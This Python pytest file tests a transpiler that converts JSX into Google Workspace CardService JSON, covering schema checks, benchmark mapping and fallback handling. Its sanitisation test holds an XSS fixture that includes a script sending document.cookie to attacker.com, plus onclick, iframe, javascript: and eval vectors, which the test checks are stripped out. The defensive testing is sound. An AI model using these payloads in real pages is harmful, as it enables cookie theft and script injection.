"""
TDD Tests for Surgeon Transpiler (Agent 5 - QA & Testing)
Verifies:
a) Correct mapping of headers, badges, and buttons into Google CardService JSON.
b) Conformance to Pydantic A2UICardPayload schema.
c) Zero Trust sanitization of dangerous characters, scripts, and injection vectors.
d) Fallback resilience on malformed JSX without raising unhandled exceptions.
e) Full coverage across all 10 v0 benchmarks.
"""

import pytest
import json
from services.surgeon.transpiler import SurgeonTranspiler
from services.schemas.card_service import (
    A2UICardPayload,
    GoogleWorkspaceCardMessage,
)
from tests.fixtures.v0_benchmarks import (
    ALL_BENCHMARKS,
    BENCHMARK_LEAD_CARD,
    BENCHMARK_KPI_DASHBOARD,
    BENCHMARK_CALL_STATUS,
    BENCHMARK_ALERT_SECURITY,
    BENCHMARK_MEETING_SCHEDULE,
    BENCHMARK_TRANSACTION_PAYMENT,
    BENCHMARK_SUPPORT_TICKET,
    BENCHMARK_AI_PROMPT_MUTATION,
    BENCHMARK_SYSTEM_TELEMETRY,
    BENCHMARK_COMPLEX_EDGE_CASE,
    BENCHMARK_INVALID_MALFORMED_JSX,
)


@pytest.fixture
def transpiler():
    return SurgeonTranspiler()


# Criterion a & b: Conformance to A2UICardPayload and Google CardService mapping
@pytest.mark.parametrize("idx, benchmark_code", list(enumerate(ALL_BENCHMARKS, 1)))
def test_transpile_all_10_benchmarks_to_a2ui_payload(transpiler, idx, benchmark_code):
    """Checks that all 10 reference benchmarks produce a valid A2UICardPayload."""
    card_id = f"benchmark_card_{idx}"
    payload = transpiler.transpile_to_payload(benchmark_code, card_id=card_id)

    # Validate A2UICardPayload Pydantic instance
    assert isinstance(payload, A2UICardPayload)
    assert payload.card_id == card_id
    assert len(payload.title) > 0
    assert len(payload.sections) >= 1
    assert len(payload.sections[0].widgets) >= 1

    # Validate conversion to Google Workspace CardService Message
    card_msg = payload.to_card_service_message()
    assert isinstance(card_msg, GoogleWorkspaceCardMessage)
    assert len(card_msg.cardsV2) == 1

    card = card_msg.cardsV2[0].card
    assert card.header is not None
    assert len(card.sections) >= 1

    # JSON serialization validation
    json_str = card_msg.to_json_str()
    parsed = json.loads(json_str)
    assert "cardsV2" in parsed


def test_benchmark_lead_card_mapping(transpiler):
    """Tests specific elements of Lead Dossier: headers, badges, buttons."""
    payload = transpiler.transpile_to_payload(BENCHMARK_LEAD_CARD, card_id="lead_01")
    assert "Alexander Wright" in payload.title
    assert "VP of Enterprise Infrastructure" in (payload.subtitle or "")

    widgets = payload.sections[0].widgets
    # Check decorated text / metrics
    top_labels = [w.top_label for w in widgets if w.top_label]
    assert "Deal Value" in top_labels or "Intent Score" in top_labels

    # Check buttons
    button_widgets = [w for w in widgets if w.widget_type == "buttonList"]
    assert len(button_widgets) >= 1
    btn_texts = [b.text for b in button_widgets[0].buttons]
    assert any("Review Dossier" in t for t in btn_texts)


def test_benchmark_complex_edge_case(transpiler):
    """Tests nested spans, JSX ternaries, and SVG icon stripping."""
    payload = transpiler.transpile_to_payload(BENCHMARK_COMPLEX_EDGE_CASE, card_id="complex_01")
    # Title with nested spans should be joined cleanly
    assert "Razum" in payload.title and "Node" in payload.title
    # No raw svg tag strings should leak into title or widgets
    assert "<svg" not in payload.title
    
    # Check that ternary operator resolved to truthy branch (NODE_ACTIVE or text)
    full_text = " ".join(w.text or "" for w in payload.sections[0].widgets)
    assert "<svg" not in full_text
    assert "NODE_ACTIVE" in full_text or "LEVEL_5_SOVEREIGN" in full_text


# Criterion c: Zero Trust sanitization of dangerous vectors
def test_zero_trust_sanitization(transpiler):
    """Ensures XSS vectors, scripts, and javascript: links are neutralised."""
    malicious_jsx = """
    <div>
      <h2 onclick="alert('xss')">Secure System Node</h2>
      <script>fetch('http://attacker.com/steal?t=' + document.cookie);</script>
      <p>Normal text description with <iframe src="evil.com"></iframe> content.</p>
      <a href="javascript:alert(1)">Dangerous Action</a>
      <button onClick={() => eval('hack')}>Safe Button</button>
    </div>
    """
    payload = transpiler.transpile_to_payload(malicious_jsx, card_id="sec_test")
    assert isinstance(payload, A2UICardPayload)

    full_payload_str = json.dumps(payload.model_dump())
    assert "<script>" not in full_payload_str
    assert "<iframe>" not in full_payload_str
    assert "javascript:" not in full_payload_str
    assert "alert('xss')" not in full_payload_str

    # Ensure Google CardService JSON output is also clean
    msg = payload.to_card_service_message()
    json_str = msg.to_json_str()
    assert "<script>" not in json_str
    assert "javascript:" not in json_str


# Criterion d: Fallback card on malformed JSX
def test_fallback_card_on_malformed_jsx(transpiler):
    """Checks that corrupted or broken JSX triggers resilient fallback without crashing."""
    payload = transpiler.transpile_to_payload(BENCHMARK_INVALID_MALFORMED_JSX, card_id="malformed_01")
    assert isinstance(payload, A2UICardPayload)
    assert "[Fallback]" in payload.title or "Recovery" in payload.title

    msg = transpiler.transpile(BENCHMARK_INVALID_MALFORMED_JSX, card_id="malformed_01")
    assert isinstance(msg, GoogleWorkspaceCardMessage)
    assert len(msg.cardsV2) == 1
    assert "cardsV2" in msg.to_json_dict()
